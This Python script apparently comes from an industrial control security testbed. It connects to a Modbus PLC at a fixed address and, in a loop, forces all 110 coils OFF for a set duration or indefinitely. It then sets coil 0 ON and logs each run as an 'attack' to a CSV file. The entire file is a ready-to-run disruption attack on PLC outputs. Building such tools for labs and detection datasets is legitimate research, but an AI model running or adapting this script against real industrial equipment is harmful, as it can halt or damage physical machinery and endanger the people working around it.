import time
import struct
import random
import argparse
import csv
import os
from datetime import datetime
from pymodbus.client import ModbusTcpClient
from colorama import Fore, Style
from utils import read_memory, write_memory, get_enabled_coils, random_float_dict

parser = argparse.ArgumentParser(
    description="Coil Reset - Sets all coils to OFF except coil 0 which stays ON",
    usage="python3 coil_reset.py --duration <DURATION>"
)

parser.add_argument("--duration", help="Duration of the attack (0 = infinite)", type=int, required=False, default=0)

args = parser.parse_args()

# Connect to Modbus device
try:
    client = ModbusTcpClient(host="192.168.60.4", port=502)
    connection_status = client.connect()
    print(Fore.GREEN + "Connection successfully established" + Style.RESET_ALL)
except Exception as e:
    print(Fore.RED + "The IP address or the port is incorrect. Please check the configurations." + Style.RESET_ALL)
    exit(1)

# --- LOGGING SETUP ---
LOG_FILE = "log_reset_plc_slitting_notching.csv"

# Define the CSV headers
csv_headers = [
    "id",
    "attack_type",
    "start_time",
    "end_time",
    "duration_seconds",
    "max_coils",
    "coils_reset_to_off",
    "coil_0_kept_on",
    "final_state_coil_0",
    "final_state_other_coils",
    "target_host"
]

# Record start time (human-readable and epoch)
start_time = time.time()
start_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

max_coils = 110

print(f"Attack running... Resetting all coils to OFF (except coil 0). Press Ctrl+C to stop manually.")
print(f"Affecting coils 0 to {max_coils-1}")

# Set up duration
if args.duration > 0:
    end_time = start_time + args.duration
    infinite = False
else:
    infinite = True
    end_time = float('inf')

attack_ended_by = "duration"
loop_count = 0

try:
    while time.time() < end_time:
        now = time.time()
        for coil in range(0, max_coils):
            client.write_coil(coil, False)
        loop_count += 1

    # Final state after normal completion
    client.write_coil(0, True)
    coil_0_final = True
    other_coils_final = False

except KeyboardInterrupt:
    print(Fore.CYAN + "\nAttack interrupted by user." + Style.RESET_ALL)
    attack_ended_by = "keyboard_interrupt"
    # Still set final state even on interrupt
    try:
        client.write_coil(0, True)
        coil_0_final = True
        other_coils_final = False
        print(Fore.YELLOW + "Final state set: Coil 0 = ON, all others = OFF" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"Failed to set final state: {e}" + Style.RESET_ALL)
        coil_0_final = None
        other_coils_final = None
finally:
    # Record end time
    end_time_actual = time.time()
    end_time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    actual_duration = end_time_actual - start_time
    
    client.close()
    print(Fore.GREEN + "Connection closed." + Style.RESET_ALL)
    
    # --- LOGGING TO CSV ---
    # Generate a unique ID based on timestamp
    attack_id = datetime.now().strftime("%Y%m%d_%H%M%S") + f"_{random.randint(1000, 9999)}"
    
    # Prepare the row data
    log_row = {
        "id": attack_id,
        "attack_type": "plc_reset",
        "start_time": start_time_str,
        "end_time": end_time_str,
        "duration_seconds": f"{actual_duration:.2f}",
        "max_coils": max_coils,
        "coils_reset_to_off": max_coils - 1,  # All except coil 0
        "coil_0_kept_on": True,
        "final_state_coil_0": coil_0_final,
        "final_state_other_coils": other_coils_final,
        "target_host": "192.168.60.4:502"
    }
    
    # Check if file exists to determine if we need to write headers
    file_exists = os.path.isfile(LOG_FILE)
    
    try:
        with open(LOG_FILE, mode='a', newline='') as csv_file:
            writer = csv.DictWriter(csv_file, fieldnames=csv_headers)
            
            # Write header only if file is new
            if not file_exists:
                writer.writeheader()
            
            # Write the attack record
            writer.writerow(log_row)
        
        print(Fore.CYAN + f"Attack logged to {LOG_FILE} (ID: {attack_id})" + Style.RESET_ALL)
    
    except Exception as e:
        print(Fore.RED + f"Error writing to log file: {e}" + Style.RESET_ALL)